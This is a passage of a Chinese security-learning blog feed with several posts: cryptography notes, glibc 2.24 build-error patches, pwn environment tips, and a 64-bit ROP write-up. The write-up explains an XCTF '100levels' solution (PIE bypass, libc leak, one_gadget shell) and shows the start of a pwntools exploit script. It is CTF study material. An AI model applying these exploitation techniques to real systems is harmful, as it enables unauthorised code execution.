      <url>/2019/03/21/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>学习网络安全协议的时候用到了很多现代密码学的知识，也重新去学习了现代密码学的应用。想要有体系的整理在这里。</p></blockquote><a id="more"></a> <h2><span id="基本介绍">基本介绍</span></h2><h3><span id="加密算法">加密算法</span></h3><p>现代密码学主要分为对称密码和非对称密码两种。对称密码中主要有分组加密(AES、DES)、和流密码(RC4、LFSR). 非对称密码体制主要有RSA和Elgamal. 对称密码中，通信双方共享同一个秘钥，加密解密都使用这个秘密的key. 而非对称密码体制下，通信双方将使用不同的秘钥，公钥加密的内容需要私钥可以解密。私钥加密的内容，需要公钥解密。非对称密码的安全性都是基于数学上的单向函数保证的，比如RSA基于大数分解的问题，Elgamal基于基于DLP离散对数问题。</p><h3><span id="对称密码">对称密码</span></h3><p>用到对称加密的时候相对来说比较少需要管对称加密的内部结构，比如S盒子、置换之类的。把对称加密看成一个黑箱，以AES举例，这个黑箱就是坚不可摧的，从算法上来考虑是没有漏洞的。但是分组加密中有很多不同的模式，其中ECB、CFB模式下是可以做文章的，以及数据长度没有刚好填满一组时的padding也有经典的padding oracle问题，这些可以之后写相关的blog总结。<strong>然而在实际通信里，如果有一个秘密信道可以保证双方共享了一个秘钥，那么更加倾向使用对称加密的方法，因为对称加密比非对称加密效率高很多</strong>。量子通信中也是希望实现秘钥分发过程中无法被破解，那么也就是保证了一个秘密信道，然后使用对称密码快速的加密传输消息。理论上最为安全的是使用一次一秘，明文多长秘钥多长，那么绝对安全。但是实际上量子信道的带宽是远小于传统信道的，所以一般来说是通过分发一个长度比较小的秘钥然后派生出更多的秘钥的方案来解决这个问题。秘钥派生感觉也很讲究，有很多不同的方案，我的理解是就相当于是使用初始秘钥作为种子，然后是RNG生成更多的秘钥。如果种子长度足够长，而且RNG算法够好的话，派生出来的秘钥也就是安全的了。</p><h3><span id="非对称密码">非对称密码</span></h3><p>相比于对称加密需要双方共享同一个秘密的秘钥，非对称加密使用就很灵活。一对秘钥来进行加解密让非对称加密可以使用的情景就丰富很多。一般而言，私钥没有备份，仅保留在所有者的本机上。这个私钥对应的公钥可以随便分发。（其实还需要注册证书之后再说）因为公钥很多人都有，如果通信双方的对象身份已经确认，那么使用公钥加密发送信息，这个密文就只有私钥持有者可以解密信息，保证消息的保密性。反过来，如果一短消息用私钥加密，只有公钥可以解密，那么私钥加密的消息可以保证是本人的行为，于是私钥加密一般也就成为签名，这也就是数字签名。要保证消息来源的可靠性，我们要确认这个消息是Alice发的，那么这个消息上附带有Alice的签名即可。这也是消息确认码（Message Authentication Code)的一种实现方式。</p><h3><span id="更多的考虑">更多的考虑</span></h3><p>在实际情况中，没有外加约束条件时，双方通信一般是通过非对称秘钥来传送会话秘钥（会话秘钥Session Key一般就是对称加密的秘钥），然后双方使用对称秘钥来实现通信。这样做的理由是对称加密的开销比非对称加密小得多。然而细想就会发现，使用非对称加密方法来实现通信实际上还有很多没有考虑的因素：</p><ol><li>对方是我要发信息的人吗？这个公钥是对方的吗？</li><li>我接收到的消息有没有被人破坏？</li><li>我接收到的消息是实时的吗？有没有可能是有人重放消息？</li></ol><p>我的理解是，只考虑密码学算法只是保证了<strong>保密性</strong>，灵活的使用密码学算法才能保证：<strong>完整性</strong>，<strong>实体真实</strong>，<strong>不可否认性</strong>。所谓完整性，就是保证消息没有被篡改。Alice发过来的下午3点见没有变成下午4点见。实体真实性是保证我这个消息是给Alice发过去的，不是发给了某个攻击者。不可否认性是保证消息不可抵赖，比如Alice发给银行的消息里有获得了50元，她不能重放这个消息无限制刷钱。我的理解是，一个完备的通信过程需要依次保证：实体真实、保密完整、不可抵赖。为了确保这些条件满足，引出以下概念。其实都是加密算法的应用：Digital Envelope、Public Key Infrastructure（想到在写，先存稿）</p><h3><span id="digital-envelope">Digital Envelope</span></h3><p>由于非对称密码的运算复杂、加/解密速度慢，因此信息的加密采用对称密码算法，其会话密钥的分发采用非对称密码算法，即采用收方的公钥对会话密钥进行加密。这个其实就是使用数字信封发送会话秘钥（待补充）</p><h2><span id="public-key-infrastructure">Public Key Infrastructure</span></h2><p>（待补充）</p>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译glibc遇到的问题</title>
      <link href="/2019/03/20/%E7%BC%96%E8%AF%91glibc%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2019/03/20/%E7%BC%96%E8%AF%91glibc%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>因为学习堆的时候需要glibc2.26以下的版本，决定自己在docker里编译一个glibc2.24，中间遇到一些bug记录如下</p></blockquote><a id="more"></a> <h2><span id="symver-on-common-symbols">.symver on common symbols</span></h2><p>编译时报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/ccPRCqlU.s: Error: `loc1@GLIBC_2.2.5<span class="string">' can'</span>t be versioned to common symbol <span class="string">'loc1'</span></span><br><span class="line">/tmp/ccPRCqlU.s: Error: `loc2@GLIBC_2.2.5<span class="string">' can'</span>t be versioned to common symbol <span class="string">'loc2'</span></span><br><span class="line">/tmp/ccPRCqlU.s: Error: `locs@GLIBC_2.2.5<span class="string">' can'</span>t be versioned to common symbol <span class="string">'locs'</span></span><br></pre></td></tr></table></figure></p><p>解决方案:<a href="https://patchwork.ozlabs.org/patch/780067/" target="_blank" rel="noopener">https://patchwork.ozlabs.org/patch/780067/</a><br><strong>patch</strong><br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/misc/regexp.c</span></span><br><span class="line"><span class="comment">+++ b/misc/regexp.c</span></span><br><span class="line"><span class="meta">@@ -29,14 +29,15 @@</span></span><br><span class="line"> </span><br><span class="line"> #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-/* Define the variables used for the interface.  */</span></span><br><span class="line"><span class="deletion">-char *loc1;</span></span><br><span class="line"><span class="deletion">-char *loc2;</span></span><br><span class="line"><span class="addition">+/* Define the variables used for the interface.  Avoid .symver on common</span></span><br><span class="line"><span class="addition">+   symbol, which just creates a new common symbol, not an alias.  */</span></span><br><span class="line"><span class="addition">+char *loc1 __attribute__ ((nocommon));</span></span><br><span class="line"><span class="addition">+char *loc2 __attribute__ ((nocommon));</span></span><br><span class="line"> compat_symbol (libc, loc1, loc1, GLIBC_2_0);</span><br><span class="line"> compat_symbol (libc, loc2, loc2, GLIBC_2_0);</span><br><span class="line"> </span><br><span class="line"> /* Although we do not support the use we define this variable as well.  */</span><br><span class="line"><span class="deletion">-char *locs;</span></span><br><span class="line"><span class="addition">+char *locs __attribute__ ((nocommon));</span></span><br><span class="line"> compat_symbol (libc, locs, locs, GLIBC_2_0);</span><br></pre></td></tr></table></figure></p><h2><span id="target-rootbuildmathe_powo-failed">target ‘/root/build/math/e_pow.o’ failed</span></h2><p>报错如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">../sysdeps/ieee754/dbl-64/e_pow.c:469:13: error: ‘&lt;&lt;’ <span class="keyword">in</span> boolean context, did you mean ‘&lt;’ ? [-Werror=int-in-bool-context]</span><br><span class="line">       <span class="keyword">if</span> (n &lt;&lt; (k - 20))</span><br><span class="line">           ~~^~~~~~~~~~~</span><br><span class="line">../sysdeps/ieee754/dbl-64/e_pow.c:471:17: error: ‘&lt;&lt;’ <span class="keyword">in</span> boolean context, did you mean ‘&lt;’ ? [-Werror=int-in-bool-context]</span><br><span class="line">       <span class="built_in">return</span> (n &lt;&lt; (k - 21)) ? -1 : 1;</span><br><span class="line">              ~~~^~~~~~~~~~~~</span><br><span class="line">../sysdeps/ieee754/dbl-64/e_pow.c:477:9: error: ‘&lt;&lt;’ <span class="keyword">in</span> boolean context, did you mean ‘&lt;’ ? [-Werror=int-in-bool-context]</span><br><span class="line">   <span class="keyword">if</span> (m &lt;&lt; (k + 12))</span><br><span class="line">       ~~^~~~~~~~~~~</span><br><span class="line">../sysdeps/ieee754/dbl-64/e_pow.c:479:13: error: ‘&lt;&lt;’ <span class="keyword">in</span> boolean context, did you mean ‘&lt;’ ? [-Werror=int-in-bool-context]</span><br><span class="line">   <span class="built_in">return</span> (m &lt;&lt; (k + 11)) ? -1 : 1;</span><br><span class="line">          ~~~^~~~~~~~~~~~</span><br></pre></td></tr></table></figure></p><p>解决方案: <a href="https://patchwork.ozlabs.org/patch/680578/" target="_blank" rel="noopener">https://patchwork.ozlabs.org/patch/680578/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/sysdeps/ieee754/dbl-64/e_pow.c b/sysdeps/ieee754/dbl-64/e_pow.c</span><br><span class="line">index 663fa39..bd758b5 100644</span><br><span class="line"><span class="comment">--- a/!</span></span><br><span class="line"><span class="comment">+++ b/sysdeps/ieee754/dbl-64/e_pow.c</span></span><br><span class="line">@@ -466,15 +466,15 @@  checkint (double x)</span><br><span class="line">     return (n &amp; 1) ? -1 : 1;/* odd or even */</span><br><span class="line">   if (k &gt; 20)</span><br><span class="line">     &#123;</span><br><span class="line"><span class="deletion">-      if (n &lt;&lt; (k - 20))</span></span><br><span class="line"><span class="addition">+      if (n &lt;&lt; (k - 20) != 0)</span></span><br><span class="line"> return 0;/* if not integer */</span><br><span class="line"><span class="deletion">-      return (n &lt;&lt; (k - 21)) ? -1 : 1;</span></span><br><span class="line"><span class="addition">+      return (n &lt;&lt; (k - 21) != 0) ? -1 : 1;</span></span><br><span class="line">     &#125;</span><br><span class="line">   if (n)</span><br><span class="line">     return 0;/*if  not integer */</span><br><span class="line">   if (k == 20)</span><br><span class="line">     return (m &amp; 1) ? -1 : 1;</span><br><span class="line"><span class="deletion">-  if (m &lt;&lt; (k + 12))</span></span><br><span class="line"><span class="addition">+  if (m &lt;&lt; (k + 12) != 0)</span></span><br><span class="line">     return 0;</span><br><span class="line"><span class="deletion">-  return (m &lt;&lt; (k + 11)) ? -1 : 1;</span></span><br><span class="line"><span class="addition">+  return (m &lt;&lt; (k + 11) != 0) ? -1 : 1;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2><span id="sunrpcrpc_parsec">sunrpc/rpc_parse.c</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rpc_parse.c:543:23: error: ‘%d’ directive writing between 1 and 10 bytes into a region of size 7 [-Werror=format-overflow=]</span><br><span class="line">     sprintf (name, <span class="string">"%s%d"</span>, ARGNAME, num); /* default name of argument */</span><br><span class="line">                       ^~</span><br><span class="line">rpc_parse.c:543:20: note: directive argument <span class="keyword">in</span> the range [1, 2147483647]</span><br><span class="line">     sprintf (name, <span class="string">"%s%d"</span>, ARGNAME, num); /* default name of argument */</span><br><span class="line">                    ^~~~~~</span><br><span class="line">rpc_parse.c:543:5: note: ‘sprintf’ output between 5 and 14 bytes into a destination of size 10</span><br><span class="line">     sprintf (name, <span class="string">"%s%d"</span>, ARGNAME, num); /* default name of argument */</span><br><span class="line">     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>解决方案:<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/sunrpc/rpc_parse.c</span></span><br><span class="line"><span class="comment">+++ b/sunrpc/rpc_parse.c</span></span><br><span class="line">@@ -521,7 +521,7 @@ static void</span><br><span class="line"> get_prog_declaration (declaration * dec, defkind dkind, int num /* arg number */ )</span><br><span class="line"> &#123;</span><br><span class="line">   token tok;</span><br><span class="line"><span class="deletion">-  char name[10];/* argument name */</span></span><br><span class="line"><span class="addition">+  char name[MAXLINESIZE];/* argument name */</span></span><br></pre></td></tr></table></figure></p><h2><span id="nisnss_nisplusnisplus-aliasc">nis/nss_nisplus/nisplus-alias.c</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nss_nisplus/nisplus-alias.c:300:12: error: argument 1 null <span class="built_in">where</span> non-null expected [-Werror=nonnull]</span><br><span class="line">[ERROR]      nss_nisplus/nisplus-alias.c:303:39: error: <span class="string">'%s'</span> directive argument is null [-Werror=format-truncation=]</span><br><span class="line">[ERROR]      make[3]: *** [/Volumes/OSXElCapitan/Users/mrdekk/casesafe/.build/x86_64-ubuntu16.04-linux-gnu/build/build-libc-final/multilib/nis/nisplus-alias.os] Error 1</span><br><span class="line">[ERROR]      make[3]: *** Waiting <span class="keyword">for</span> unfinished <span class="built_in">jobs</span>....</span><br><span class="line">[ERROR]      make[2]: *** [nis/others] Error 2</span><br><span class="line">[ERROR]      make[1]: *** [all] Error 2</span><br></pre></td></tr></table></figure><p>解决方案：<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/nis/nss_nisplus/nisplus-alias.c b/nis/nss_nisplus/nisplus-alias.c</span><br><span class="line">index 7f698b4e6d..509ace1f83 100644</span><br><span class="line"><span class="comment">--- a/nis/nss_nisplus/nisplus-alias.c</span></span><br><span class="line"><span class="comment">+++ b/nis/nss_nisplus/nisplus-alias.c</span></span><br><span class="line">@@ -297,10 +297,10 @@  _nss_nisplus_getaliasbyname_r (const char *name, struct aliasent *alias,</span><br><span class="line">       return NSS_STATUS_UNAVAIL;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-  char buf[strlen (name) + 9 + tablename_len];</span></span><br><span class="line"><span class="addition">+  char buf[tablename_len + 9];</span></span><br><span class="line">   int olderr = errno;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-  snprintf (buf, sizeof (buf), "[name=%s],%s", name, tablename_val);</span></span><br><span class="line"><span class="addition">+  snprintf (buf, sizeof (buf), "[name=],%s", tablename_val);</span></span><br></pre></td></tr></table></figure></p><h2><span id="build目录缺少etcldsoconf">build目录缺少/etc/ld.so.conf</span></h2><p>解决方案：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/</span><br><span class="line">touch ld.so.conf</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> glibc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>准备pwn环境的一些基本操作</title>
      <link href="/2019/03/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/03/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<a id="more"></a> <h2><span id="指定libc版本">指定libc版本</span></h2><p><strong>方法一</strong><br>LD_PRELOAD=./libc-2.26.so 来指定libc库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=`<span class="built_in">pwd</span>`</span><br><span class="line"><span class="built_in">export</span> LD_PRELOAD=你的libc<span class="comment">#加载本地pwn题目下的libc</span></span><br><span class="line"><span class="built_in">unset</span> LD_PRELOAD<span class="comment">#调试完记得删除环境变量</span></span><br></pre></td></tr></table></figure></p><p><strong>方法二</strong><br>写exp调试时，加载本地程序使用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">'./bin'</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.23.so"</span>&#125;)</span><br></pre></td></tr></table></figure></p><h2><span id="低版本libc编译的文件">低版本libc编译的文件</span></h2><p>libc中的符号有自己的版本，低版本的符号在高版本的libc中是可以找得到的：<br><a href="mailto:`read@GLIBC.2.21" target="_blank" rel="noopener">`read@GLIBC.2.21</a>`在libc版本为2.27的系统上是可以运行的</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位ROP练习</title>
      <link href="/2019/03/17/64%E4%BD%8DROP%E7%BB%83%E4%B9%A0/"/>
      <url>/2019/03/17/64%E4%BD%8DROP%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>这个博文应该会持续更新，把看到的64rop有意思的地方都写进来。以及把64位程序的一些相关知识记录一下。真实感受是，pwn技巧要能有长进的话学习是一方面，但是学习的时候别人不会面面俱到，很多细节自己没有掌握。但是有了ida有了gdb，配合各种工具应该自己多摸索。</p></blockquote><a id="more"></a><h2><span id="工具">工具</span></h2><ul><li>IDA pro</li><li>Pwndbg (gdb插件，高亮调试)</li><li>Onegadget (在libc中找到shellcode的偏移)</li><li>ROPgadget (在程序中找到特定的gadget)</li><li>libc-database (根据泄露的函数地址的后12位找到libc版本)</li></ul><h2><span id="基本知识">基本知识</span></h2><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同：<br><img src="/assets/img/rop/64.png" alt="64位寄存器"></p><h3><span id="和函数栈有关的指令解释">和函数栈有关的指令解释</span></h3><p>leave等价于<code>mov rsp, rbp ;pop rbp;</code> (注意，pop rbp后，rsp会自动忘高地址移动一个指针，所以再ret就会pop retaddr)<br>retn等价于<code>pop rip</code>; (这里n是near的意思，指不pop cs) 然后执行rip指向的那条指令<br>retf等价于<code>pop rip; pop rcs</code></p><p><strong>可以发现不管是leave还是ret都不会再次调整rsp了，因为一般函数的开头都会执行</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp, rsp</span><br><span class="line">sub rsp, Constant</span><br></pre></td></tr></table></figure></p><h2><span id="一般分析的思路">一般分析的思路</span></h2><p><strong>leak info –&gt; get function addr –&gt; get libc base –&gt; get shell</strong></p><p>rop的题有时给libc有时又不给，其实这个差别现在来看并不大, 即使开启了PIE也可以用libc-database找libc版本。分析题目，如果没有开启PIE，那方便，只要有溢出直接rop。如果开了canary，那得根据情况分析。开了PIE，这时候第一步是leak info，必须得有地方去rop，盲打不现实。leak info的时候就充分利用按段加载的特性和最低12位不变的特性来做，但是要注意栈每次加载还是会有变化，即使是最低12位也会不同。通过泄露地址来配合ropgadgets使用，要泄露出程序加载的地址才有用。另外就是看利用read和printf和puts看能不能想办法泄露libc基地址，给了libc加基地址就能够rop到libc里了，配合onegadget已经可以getshell了。如果没有给libc版本就在使用libc-database查找就好。此外还有GOT表可不可以被劫持的问题，如果开了full RELRO的话，GOT是不可以写的。最后落实到写exploit上，使用pwntools时可以把已知的信息放到最开始的变量里，需要泄露的信息中间再写。</p><h2><span id="offset的说明">offset的说明</span></h2><p>已知在64位的情况下经常会开启PIE，地址随机的情况下最低的12位是固定的，而且64位机器上最高两个字节都是0，而第三位一般是0x55。</p><ul><li>ROPgadget给出的地址是相对于程序加载地址的偏移地址，即使开了PIE，leak出加载的基地址后gadgets也是可以用的</li><li>onegadget给出的是相对于libc基地址的偏移地址</li><li>pwntools给出的got，plt信息是相对于程序加载地址的偏移(开了PIE也是)</li></ul><p>程序加载的基地址之前还一直不知道在哪，自己调出来的：<br><img src="/assets/img/rop/load.png" alt="程序加载基地址"></p><h2><span id="找地址的方法">找地址的方法</span></h2><p>以前喜欢用gdb打断点慢慢调，但是因为静态分析的时候就是用的ida，如果不是用到堆相关的东西，动态调试还是继续用ida吧，打断点到关键代码然后看栈和代码段的信息，因为可以配合伪代码看，还挺方便的。但是有的时候ida给的伪代码有时候识别不出来变量的真实情况，<strong>比如有时候就看不出来这个变量是在栈上的，需要慢慢看汇编</strong>。view里的open subview来找各个段很方便。</p><h2><span id="pwntools配合gdb调试">pwntools配合gdb调试</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">p = process(<span class="string">'./xxxx'</span>)</span><br><span class="line"> </span><br><span class="line">payload = .....</span><br><span class="line">pwnlib.gdb.attach(p)</span><br><span class="line">pause() <span class="comment"># gdb里打断点</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ps:<br>还可以使用其他xterm，tmux等其他终端，如果脚本运行在tmux中，可以这样指定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br></pre></td></tr></table></figure></p><p>这两种可以让gdb运行在横向或者纵向分割出来的tmux窗口中。</p><p>另外，也可以在attach的时候指定gdb脚本，这样可以断在自己想的地方。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(proc.pidof(s)[<span class="number">0</span>], execute=<span class="string">'b *0x400620\nc\n'</span>)</span><br></pre></td></tr></table></figure></p><h2><span id="pwntools配合ida调试">pwntools配合IDA调试</span></h2><p>用socat把程序挂在虚拟机的固定端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:端口号,reusseaddr,fork <span class="built_in">exec</span>:程序位置</span><br><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./heapTest_x86,pty,raw,<span class="built_in">echo</span>=0 <span class="comment">#例子</span></span><br></pre></td></tr></table></figure></p><ul><li>这时候可以选择host或者虚拟机里打开python用pwntools的remote连上程序了(仅仅使用remote)</li><li>返回ida选择attach to process，刚开始可以打好断点按f9跳过.最后就是使用ipython里的pwntools开心的调试了</li><li>不用ipython的话配合pause使用更佳</li></ul><h2><span id="实战">实战</span></h2><h3><span id="xctf100levels">XCTF——100levels</span></h3><p>题目给了libc，拿到程序看一下开了什么保护：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>开了PIE的题目，第一步就是leak info，找到栈上有一个变量被printf函数调用并且没做检查，突破口找到。如果能把这个栈地址上放一个.text的地址，通过printf可以泄露一部分信息。有意思的是只让泄露4个字节，高2字节为0，低一个半字节确定的情况下，需要爆破4个半字节。<br><img src="/assets/img/100/leak" alt="leak"><br>又考虑到代码段加载通常高第三个字节为0x55或者0x56，因此可以考虑让rbp的偏移刚好为泄露从低位开始的第2，3，4，5字节，代码段的地址就被泄露出来了。已知这个地址就可以开始rop了，通过rop一个puts的<strong>libc_start_main的got表调用，返回地址设置成main函数地址。libc及地址也就有了。再用一下onegadget大功告成。写一个脚本暴力枚举一下，按理来说有3%多的概率让rbp-0x34撞到rip.<br><img src="/assets/img/100/flag" alt="flag"><br><strong>总结</strong><br>这题需要partial-write栈基栈泄露地址来绕过PIE.利用情况即为栈上某一变量可被泄露时，通过栈溢出rop分别泄露加载地址和libc基地址。这里泄露libc式的rop找的太轻松了，也是一种套路吧，puts调用</strong><a href="mailto:libc_start_main@got.plt" target="_blank" rel="noopener">libc_start_main@got.plt</a>.细节上要注意的是动态调试的时候多用pause断下来，判断好exploit写对了没。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(x))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(y))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./100levels'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh = process(<span class="string">'./100levels'</span>)</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span 